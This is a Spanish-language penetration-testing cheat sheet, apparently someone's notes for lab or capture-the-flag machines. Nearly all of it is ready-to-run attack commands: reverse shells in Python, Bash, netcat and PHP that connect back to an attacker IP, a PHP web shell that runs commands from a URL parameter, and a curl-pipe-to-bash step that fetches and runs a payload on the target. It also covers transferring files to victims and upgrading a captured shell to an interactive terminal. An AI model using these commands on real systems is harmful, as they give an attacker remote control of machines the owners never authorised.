
- Python Web Server:
  - Una forma de pasar un archivo a una máquina target es desplegar un servidor web con Python en tu propia máquina con los siguientes comandos:
    - Local: `python3 -m http.server 5050`
    - Objetivo: `wget http://ip:5050/nombre_archivo`

- Python Reverse Shell:
  - Para obtener una shell reversa con Python:
    - Local: `nc -lvnp 8080`
    - Objetivo: 
      ```
      import os; os.system('bash -c "bash -i >& /dev/tcp/IP/8080 0>&1"') 
      ó 
      python -c 'import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("10.0.0.1", 1234)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p=subprocess.call(["/bin/sh", "-i"]);'
      ```

- Bash Reverse Shell:
  - Para obtener una shell reversa con Bash:
    - Local: `nc -lvnp 8080`
    - Objetivo: `bash -i >& /dev/tcp/IP/8080 0>&1` (puede ser necesario hacer un echo y pasarselo a bash con una pipe {echo "bash -i ..." | bash})

- NC reverse shell:
	- nc -e /bin/sh 10.0.0.1 1234
	- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.196 1111 >/tmp/f (puede ser que la opción -e no exista en la versión de nc instalada)

- Shell Reversa de PHP:
	- `exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.60.226/4444 0>&1'");`
  - En ocasiones, la shell reversa de PHP no funcionará. Entonces, puedes utilizar el siguiente script de PHP que tomará un argumento llamado cmd, cuyo valor se ejecutará en la máquina objetivo:
    ```
    <?php system($_GET['cmd']) ?>
    ```
  - Accede a la nueva página pasando el argumento: `?cmd=commando_a_ejecutar`
  - Para crear la shell reversa, genera un script en tu máquina local de la siguiente manera:
    ```
	#casi mejor utilizar este comando mágico
	bash%20-c%20"bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.26%2F1234%200%3E%261"

    sh -i >& /dev/tcp/IP/puerto 0>&1
    ```
  - Crea un servidor HTTP en tu máquina con Python para compartir este archivo y en el argumento cmd de la página anterior, introduce el siguiente comando:
    ```
    ?cmd=curl IP:PUERTO/NOMBRE_ARCHIVO | bash
    ```
  - IMPORTANTE: Antes de ejecutar esta última instrucción, escucha en tu máquina local con `nc` en el mismo puerto indicado para recibir la shell.

- Tratamiento de TTY:
  - En muchas ocasiones, cuando se consigue acceso remoto a un servidor, la configuración de la consola no permite ejecutar ciertos comandos. Para obtener una shell interactiva, existen distintos métodos:
    - Python:
      ```
      python -c 'import pty; pty.spawn("/bin/bash")'
      Ctrl+z (SE SALDRÁ DE LA SESIÓN)
      stty raw -echo (YA EN LA CONSOLA DE TU MÁQUINA)
      fg
      export TERM=xterm
      ls
      ```
    - Script:
      ```
      script /dev/null -c bash
      Ctrl+z
      stty raw -echo; fg
      reset
      ¿terminal type?xterm
      export TERM=xterm
      export SHELL=bash
      
      En local: stty -a (para ver numero de filas y columnas)
      stty rows x columns y
	```
